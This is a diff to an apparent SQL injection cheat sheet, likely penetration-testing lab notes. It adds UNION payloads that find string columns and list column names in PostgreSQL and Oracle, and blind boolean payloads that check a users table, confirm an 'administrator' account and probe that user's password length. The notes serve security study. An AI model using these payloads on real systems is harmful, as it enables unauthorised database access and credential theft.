@@ -8,6 +8,12 @@
 
 
 
+#To find a column containing strings
+
+' union select null, 'null', null-- -
+
+
+
 #To fetch database version
 
 ' union select banner, null from v$version-- - >> Oracle
@@ -28,7 +34,7 @@
 
 #To fetch column name
 
-SELECT column_name,null FROM information_schema.columns WHERE table_name='table name' >> PostgreSQL
+' union SELECT column_name,null FROM information_schema.columns WHERE table_name='table name'-- - >> PostgreSQL
 
 ' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - >> Oracle
 
@@ -40,11 +46,11 @@ SELECT column_name,null FROM information_schema.columns WHERE table_name='table 
 
 
 
-#Blind SQL injection with conditional responses
+#Blind based Boolean SQL injection with conditional responses
 
-' and (select 'x' from users LIMIT 1)='x'-- -
+' and (select 'x' from users LIMIT 1)='x'-- - >> To determine if the [users] table is exist or not.
 
-' and (select username from users where username='administrator')='administrator'-- -
+' and (select username from users where username='administrator')='administrator'-- - >> To determine the username
 
 ' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'-- -
 
